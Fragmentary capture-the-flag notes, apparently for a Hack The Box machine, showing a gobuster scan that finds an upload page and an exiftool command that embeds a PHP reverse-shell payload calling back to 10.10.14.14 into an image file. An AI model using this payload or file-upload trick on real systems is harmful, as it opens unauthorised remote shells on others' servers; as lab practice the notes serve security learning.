P 80

![[Pasted image 20240919083202.png]]

Gobsuster reveals an upload page

```php
gobuster dir -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-big.txt -u http://editorial.htb/
```

`/upload`

CMS
2017–2023 Editorial Tiempo Arriba

Using exiftool to put a php payload in a jpg file:

```php
exiftool -Comment='<?php $sock=fsockopen("10.10.14.14",8443);exec("/bin/sh -i <&3 >&3 2>&3"); ?>' tanya.jpg -o polyglot.php
```

![[Pasted image 20240919085111.png]]

It looks like i can provide a URL in the book cover request. 

